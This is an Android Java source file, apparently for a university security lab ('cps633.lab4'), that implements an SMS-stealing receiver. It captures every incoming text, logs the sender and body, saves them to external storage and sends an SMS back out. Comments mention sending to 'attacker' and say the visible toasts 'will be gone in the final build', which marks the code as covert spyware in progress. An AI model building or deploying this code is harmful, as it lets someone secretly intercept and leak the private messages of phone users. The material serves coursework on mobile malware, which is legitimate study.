package cps633.lab4;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

/* Class used to listen for incoming SMS Messages */
public class SMSReceiver extends BroadcastReceiver{

    private final String smsIntent = "cps633.lab4";

    // Get the object of SmsManager
    final SmsManager sms = SmsManager.getDefault();
    String senderNum;
    String message;

    public void onReceive(Context context, Intent intent) {

        String action = intent.getAction();

        if(smsIntent.equals(action)){
            //sendSMS to attacker
        }

        else if(1==1) {
            // Retrieves a map of extended data from the intent.
            final Bundle bundle = intent.getExtras();

            try {
                if (bundle != null) {
                    //pdus = Protocol Description Unit. Used by SMS btw.

                    //Why cast bundle.get as Object[] you say?
                    //Well:

                /*
                    A PDU is a "protocol description unit", which is the industry format for an SMS message.
                    Because SMSMessage reads/writes them you shouldn't need to dissect them.
                    A large message might be broken into many, which is why it is an array of objects.
                 */

                    final Object[] pdusObj = (Object[]) bundle.get("pdus");

                    for (Object aPdusObj : pdusObj) {

                        SmsMessage currentMessage;
                        currentMessage = SmsMessage.createFromPdu((byte[]) aPdusObj);

                        senderNum = currentMessage.getDisplayOriginatingAddress(); //get sendernum
                        message = currentMessage.getDisplayMessageBody(); //get msg

                        Log.d("SmsReceiver", "senderNum: " + senderNum + "; message: " + message);

                        String data = "Sender Num: " + senderNum + " Message: " + message;

                        writeToFile(data, context, senderNum, message);

                        // SHOW DA TOAST
                        int duration = Toast.LENGTH_LONG;
                        Toast toast = Toast.makeText(context,
                                "senderNum: " + senderNum + ", message: " + message, duration);
                        //This will be gone in the final build
                        toast.show();
                    }
                }

            } catch (Exception e) {
                Log.e("SmsReceiver", "Exception  smsReceiver" + e);
            }
        }
    }

    private void writeToFile(String data, Context context, String senderNum, String message) throws IOException {
        try {
                String baseFolder = context.getExternalCacheDir().getAbsolutePath();

                File file = new File(baseFolder + File.separator + "test.txt");
                file.getParentFile().mkdirs();

                Log.d("File", file.getAbsolutePath());

                FileOutputStream fos = new FileOutputStream(file);

                fos.write(data.getBytes());
                fos.flush();
                fos.close();

                sendSMS(context, senderNum, message);
        }
        catch (Exception e) {
            Log.e("writeToFile", "Exception writeToFile" + e);
        }
    }

    public static void sendSMS(Context context, String senderNum, String message) {
        Log.d("sendSMS", "Sending a SMS now!");

        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(senderNum, null, message, null, null);

            //this will be gone in the final build
            Toast.makeText(context.getApplicationContext(), "SMS sent.",
                    Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            Toast.makeText(context.getApplicationContext(),
                    "SMS failed, please try again.",
                    Toast.LENGTH_LONG).show();
            e.printStackTrace();
        }
    }
}